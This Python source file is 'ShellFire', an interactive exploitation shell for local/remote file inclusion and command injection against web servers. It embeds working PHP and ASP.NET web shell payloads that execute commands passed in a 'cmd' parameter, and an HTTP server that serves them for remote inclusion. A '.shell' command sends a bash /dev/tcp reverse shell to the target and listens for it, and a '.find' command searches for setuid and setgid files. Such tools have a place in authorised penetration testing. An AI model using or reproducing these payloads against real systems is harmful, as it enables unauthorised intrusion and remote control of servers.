#!/bin/env python3
# Thanks to Offensive-Security for inspiring this!
# Written by unix-ninja
# Aug 2016

import argparse
import base64
import json
import os
import re
import readline
import requests
import select
import socket
import sys
import threading
import time

from plugin_collection import PluginCollection

############################################################
## Version Check

if (sys.version_info < (3, 0)):
  sys.stderr.write("[!] Error! Must execute this script with Python3.");
  sys.exit(2)

############################################################
## Configs

class cfg:
  version = "0.7.b"
  url = "http://www.example.com?"
  history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
  post_data = {}
  cookies = {}
  headers = {
    'User-Agent': '',
    'Referer': ''
  }
  
  """The default header set for outgoing requests.
  """
  default_headers = {
    'User-Agent': ''
  }

  method = "get"

  auth = None
  auth_user = None
  auth_pass = None
  payload = ""
  payload_type = "PHP"
  encode_chain = []
  encode = None
  marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
  http_port = 8888
  http_running = False
  revshell_running = False

plugins = PluginCollection('plugins')
userinput = None

############################################################
## Payloads

def payload_aspnet():
  cfg.payload = f"""\
{cfg.marker}<%
Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
Dim command = Request.QueryString("cmd")

Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")

Dim objExec = objShell.Exec(comspec & " /c " & command)
Dim output = objExec.StdOut.ReadAll()
%><%= output %>{cfg.marker}
"""
  cfg.payload_type = "ASP.NET"

def payload_php():
  cfg.payload = f"""\
{cfg.marker}<?php
if ($_GET['cmd'] == '_show_phpinfo') {{
  phpinfo();
}} else if ($_GET['cmd'] == '_show_cookie') {{
  var_dump($_COOKIE);
}} else if ($_GET['cmd'] == '_show_get') {{
  var_dump($_GET);
}} else if ($_GET['cmd'] == '_show_post') {{
  var_dump($_POST);
}} else if ($_GET['cmd'] == '_show_server') {{
  var_dump($_SERVER);
}} else {{
  system($_GET['cmd']) || print `{{$_GET['cmd']}}`;
}}
?>{cfg.marker}
"""
  cfg.payload_type = "PHP"

############################################################
## Parse options

parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
args = parser.parse_args()

############################################################
## Functions

def show_help(cmd=None):
  if cmd and cmd[0:1] == '.':
    cmd = cmd[1:]
  if cmd == "auth":
    sys.stdout.write(".auth - show current HTTP Auth credentials\n")
    sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
  elif cmd == "cookies":
    sys.stdout.write(".cookies - show current cookies to be sent with each request\n")
    sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
  elif cmd == "encode":
    sys.stdout.write(".encode - show current encoding used before sending commands\n")
    sys.stdout.write(".encode base64 - encode commands with base64 before sending\n")
    sys.stdout.write(".encode none - do not encode commands before sending\n")
  elif cmd == "find":
    sys.stdout.write(".find setuid - search for setuid files\n")
    sys.stdout.write(".find setgid - search for setgid files\n")
  elif cmd == "history":
    sys.stdout.write(".history clear - erase history\n")
    sys.stdout.write(".history nosave - do not write history file\n")
    sys.stdout.write(".history save - write history file on exit\n")
  elif cmd == "http":
    sys.stdout.write(".http - show status of HTTP server\n")
    sys.stdout.write(".http payload [type] - set the payload to be used for RFI\n")
    sys.stdout.write("                       supported payload types:\n")
    sys.stdout.write("                       aspnet\n")
    sys.stdout.write("                       php\n")
    sys.stdout.write(".http start [port] - start HTTP server\n")
    sys.stdout.write(".http stop - stop HTTP server\n")
  elif cmd == "marker":
    sys.stdout.write(".marker <string> - set the payload output marker to string.\n")
  elif cmd == "method":
    sys.stdout.write(".method - show current HTTP method\n")
    sys.stdout.write(".method get - set HTTP method to GET\n")
    sys.stdout.write(".method post - set HTTP method to POST\n")
  elif cmd == "post":
    sys.stdout.write(".post <json> - a json string representing post data you wish to send\n")
  elif cmd == "referer":
    sys.stdout.write(".referer - show the HTTP referer string\n")
    sys.stdout.write(".referer <string> - set the value for HTTP referer\n")
  elif cmd == "shell":
    sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
  elif cmd == "url":
    sys.stdout.write(".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n")
    sys.stdout.write("                if {} is not set, 'cmd' param will automatically be appended.\n")
  elif cmd == "useragent":
    sys.stdout.write(".useragent - show the User-Agent string\n")
    sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
  else:
    sys.stdout.write("""\
Available commands:
  .auth
  .cookies
  .encode
  .exit
  .find
  .help
  .history
  .http
  .marker
  .method
  .phpinfo
  .post
  .referer
  .shell
  .url
  .useragent
  .quit
""")

def http_server(port):
  ## super simple http. we can probably make this more robust.
  ## set up network listener first
  addr = ''
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.settimeout(1)
  sock.bind((addr, port))
  sock.listen(1)
  ## server loop
  while cfg.http_running == True:
    try:
      if not conn:
        conn, addr = sock.accept()
      request = conn.recv(1024)

      http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"

      ## send payload to the client
      conn.send(bytes(http_response, 'utf-8'))
      conn.close()
      conn = None
    except Exception as e:
      if args.debug:
        sys.stderr.write("[!] Err. socket.error : %s\n" % e)
      pass
  sys.stdout.write("[*] HTTP Server stopped\n")

def rev_shell(addr, port):
  ## setup listener for reverse shell
  port = int(port)
  cfg.revshell_running = True
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind((addr, port))
  sock.listen(1)
  conn, client_address = sock.accept()

  ## listener loop
  while True:
    socket_list = [conn, sys.stdin]
    read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])

    ## wait for connections
    for s in read_sockets:
      if s == conn:
        data = s.recv(4096)
        if not data:
          cfg.revshell_running = False
          return
        else:
          sys.stdout.write(data)
          sys.stdout.flush()
      else:
        msg = input()
        conn.send(msg)

  ## cleanup
  conn.close()
  cfg.revshell_running = False
  return

def cmd_auth(cmd):
  ## configure HTTP Basic auth settings
  if len(cmd) > 1:
    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
    cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
  else:
    sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
  return

def cmd_cookies(cmd):
  ## configure cookies to be sent to target
  if len(cmd) < 2:
    sys.stdout.write("[*] cookies: %s\n" % (cfg.cookies))
  else:
    try:
      cmd.pop(0)
      cfg.cookies = json.loads(" ".join(cmd))
    except Exception as e:
      sys.stderr.write("[!] %s\n" % e)
  return

def cmd_encode(cmd):
  ## if no params passed, display current encoding plugins
  if len(cmd) == 1:
    sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
    return False
  ## Set our encoding plugins!
  ## let's remove ".encode" from our cmd
  cmd.pop(0)
  ## reset our chain
  cfg.encode_chain = []
  ## try to load our plugins
  try:
    for c in cmd:
      if c != "|" and c != "''" and c != '""':
        if c in plugins.plugins:
          cfg.encode_chain.append(c)
        else:
          cfg.encode_chain = []
          sys.stdout.write("[!] Invalid plugin %s\n" % (c))
          return False
  except:
    pass
  return False

def cmd_find(cmd):
  ## run "find" on remote target
  if len(cmd) != 2:
    sys.stdout.write("[!] Invalid parameters\n")
    return False
  if cmd[1] == "setgid":
    userinput = "find / -type f -perm -02000 -ls"
  elif cmd[1] == "setuid":
    userinput = "find / -type f -perm -04000 -ls"
  else:
    sys.stderr.write("[!] Invalid parameters\n")
    return False
  return True

def cmd_help(cmd):
  if len(cmd) == 2:
    show_help(cmd[1])
  else:
    show_help()
  return

def cmd_history(cmd):
  ## configure history settings for shellfire (via readline)
  if len(cmd) == 1:
    if os.path.isfile(cfg.history_file):
      sys.stdout.write("[*] History writing is enabled\n")
    else:
      sys.stdout.write("[*] History writing is disabled\n")
  else:
    if cmd[1] == "clear":
      readline.clear_history()
      sys.stdout.write("[*] History is cleared\n")
    elif cmd[1] == "save":
      with open(cfg.history_file, 'a'):
        os.utime(cfg.history_file, None)
      sys.stdout.write("[*] History writing is enabled\n")
    elif cmd[1] == "nosave":
      os.remove(cfg.history_file)
      sys.stdout.write("[*] History writing is disabled\n")
  return

def cmd_http(cmd):
  ## control our local http server
  if len(cmd) == 1:
    if cfg.http_running == True:
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
      sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
    else:
      sys.stdout.write("[*] HTTP server is not running\n")
    return
  if cmd[1] == "start":
    if cfg.http_running == False:
      if len(cmd) > 2:
        try:
          cfg.http_port = int(cmd[2])
        except Exception as e:
          sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
          return False
      s = threading.Thread(target=http_server, args=(cfg.http_port,))
      s.start()
      cfg.http_running = True
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
    else:
      sys.stderr.write("[!] HTTP server already running\n")
  elif cmd[1] == "stop":
    if cfg.http_running == True:
      cfg.http_running = False
      time.sleep(1)
    else:
      sys.stderr.write("[!] HTTP server already stopped\n")
  elif cmd[1] == "payload":
    if cmd[2] == "aspnet":
      payload_aspnet()
    elif cmd[2] == "php":
      payload_php()
    else:
      sys.stderr.write("[!] Unrecognized payload type\n")
      return
    sys.stdout.write("[*] HTTP payload set: %s\n" % cfg.payload_type)
  return

def cmd_marker(cmd):
  ## set the marker for our rce payloads
  ## this will determine boundaries to split and clean output
  if len(cmd) != 2:
    sys.stderr.write("[!] Invalid parameters\n")
    return
  cfg.marker = cmd[1]
  sys.stdout.write("[*] Payload output marker set\n")
  return

def cmd_method(cmd):
  ## configure HTTP method to use against the target
  if len(cmd) > 2:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .method <method>\n")
    return
  if len(cmd) == 2:
    if cmd[1] == "post":
      cfg.method = "post"
    else:
      cfg.method = "get"
  sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
  return

def cmd_phpinfo(cmd):
  ## trigger phpinfo payload
  userinput = "_show_phpinfo"
  return True

def cmd_post(cmd):
  ## configure POST data to send
  if len(cmd) < 2:
    cfg.post = {}
  else:
    cmd.pop(0)
    cfg.post = json.loads(" ".join(cmd))
  sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
  return

def cmd_referer(cmd):
  ## set HTTP referer
  if len(cmd) > 1:
    cmd.pop(0)
    cfg.headers['Referer'] = " ".join(cmd)
  sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
  return

def cmd_headers(cmd):
  """List or configure the HTTP request headers
    .headers
    .headers default
    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
  Args:
      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
  """
  if len(cmd) < 1:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
    sys.stderr.write("    .headers default\n")
    return
  elif len(cmd) == 1:
    sys.stdout.write("[*] Request headers are: \n")
    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
    return
  try:
    cmd.pop(0)
    if "".join(cmd).strip() == "default":
      # Apply the default headers here
      cfg.headers = cfg.default_headers
      sys.stdout.write("[*] Set request headers back to default...\n")
    else:
      # Convert deserialize the json
      tmp_headers = json.loads(" ".join(cmd))
      
      # Upsert into cfg.headers
      for header in tmp_headers:
        if header not in cfg.headers:
          cfg.headers[header] = tmp_headers[header]
        else:
          if cfg.headers[header] != tmp_headers[header]:
            cfg.headers[header] = tmp_headers[header]
      
      # Sanity check
      sys.stdout.write("[*] Request headers are now: \n")
      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
  except Exception as e:
    sys.stderr.write("[!] %s\n" % e)


def cmd_shell(cmd):
  ## initiate a reverse shell via rce
  if len(cmd) != 3:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .shell <ip_address> <port>\n")
    return
  sys.stdout.write("[*] Initiating reverse shell...\n")
  host = cmd[1]
  port = cmd[2]
  userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"

  # open our reverse shell in a new thread
  s = threading.Thread(target=rev_shell, args=(host, port))
  s.start()

  # make sure the thread is init before proceeding
  time.sleep(1)

  return True

def cmd_url(cmd):
  ## set URL for remote target
  if len(cmd) > 1:
    cfg.url = userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
  return

def cmd_useragent(cmd):
  ## set the user agenet to send to target
  if len(cmd) > 1:
    cfg.headers['User-Agent'] = userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
  return

############################################################
## Main App

## if we are generating a payload to stdout, do it now, then bail
if args.payload:
  args.payload = args.payload.lower()
  if args.payload == "php":
    sys.stderr.write("[*] Generating PHP payload...\n")
    payload_php()
  elif args.payload == "aspnet":
    sys.stderr.write("[*] Generating ASP.NET payload...\n")
    payload_aspnet()
  else:
    sys.stderr.write("[*] Invalid payload!\n")
  sys.stdout.write(cfg.payload)
  sys.exit(1)

## show our banner
sys.stdout.write(""" (                                            
 )\ )    )       (   (   (                    
(()/( ( /(    (  )\  )\  )\ )  (   (      (   
 /(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
(_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
/ __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
\__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
|___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
""")
sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
sys.stdout.write("[*] Type '.help' to see available commands\n")
if args.debug == True:
  sys.stdout.write("[*] Debug mode enabled.\n")

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


## setup history
if os.path.isfile(cfg.history_file):
  try:
    readline.read_history_file(cfg.history_file)
  except:
    pass

## set initial payload for PHP
payload_php()

## main loop
while True:
  while cfg.revshell_running:
    time.sleep(0.1)
  ## reset command execution state each loop
  exec_cmd = False
  ## draw our prompt
  userinput = input('>> ')
  if not userinput:
    continue
  ## parse our input
  cmd = userinput.split()
  if cmd[0] == ".exit" or cmd[0] == ".quit":
    cfg.http_running = False
    if os.path.isfile(cfg.history_file):
        readline.write_history_file(cfg.history_file)
    sys.exit(0)
  elif cmd[0] == ".auth":
    cmd_auth(cmd)
  elif cmd[0] == ".cookies":
    cmd_cookies(cmd)
  elif cmd[0] == ".encode":
    exec_cmd = cmd_encode(cmd)
  elif cmd[0] == ".find":
    exec_cmd = cmd_find(cmd)
  elif cmd[0] == ".help":
    cmd_help(cmd)
  elif cmd[0] == ".history":
    cmd_history(cmd)
  elif cmd[0] == ".http":
    cmd_http(cmd)
  elif cmd[0] == ".marker":
    cmd_marker(cmd)
  elif cmd[0] == ".method":
    cmd_method(cmd)
  elif cmd[0] == ".phpinfo":
    exec_cmd = cmd_phpinfo(cmd)
  elif cmd[0] == ".post":
    cmd_post(cmd)
  elif cmd[0] == ".referer":
    cmd_referer(cmd)
  elif cmd[0] == ".headers":
    cmd_headers(cmd)
  elif cmd[0] == ".shell":
    exec_cmd = cmd_shell(cmd)
  elif cmd[0] == ".url":
    cmd_url(cmd)
  elif cmd[0] == ".useragent":
    cmd_useragent(cmd)
  else:
    exec_cmd = True

  ## execute our command to the remote target
  if exec_cmd:
    cmd = userinput

    ## let's run our input through our encoding plugins
    if len(cfg.encode_chain):
      try:
        for enc in cfg.encode_chain:
          cmd = plugins.plugins[enc].run(cmd)
      except:
        pass

    ## validate the URL format
    if '{}' in cfg.url:
      query = cfg.url.replace('{}', cmd.strip())
    else:
      if '?' in cfg.url:
        if 'cmd=' not in cfg.url:
          query = cfg.url + '&cmd=' + cmd
        else:
          query = cfg.url.replace('cmd=', 'cmd=' + cmd)
      else:
        query = cfg.url + cmd.strip()
    ## log debug info
    if args.debug:
      sys.stdout.write("[D] " + query + "\n")
    try:
      if cfg.method == "post":
        r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
      else:
        r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
      ## sanitize the output. we only want to see our commands if possible
      output = r.text.split(cfg.marker)
      if len(output) > 1:
        output = output[1]
      else:
        output = output[0]
      ## display our results
      sys.stdout.write(output + "\n")
      if userinput == '_show_phpinfo':
        file = 'phpinfo.html'
        fp = open(file, 'w')
        fp.write(output)
        fp.close()
        sys.stdout.write("[*] Output saved to " + file + "\n")
    except Exception as e:
      sys.stderr.write("[!] Unable to make request to target\n")
      sys.stderr.write("[!] %s\n" % e)
      sys.stdout.flush()

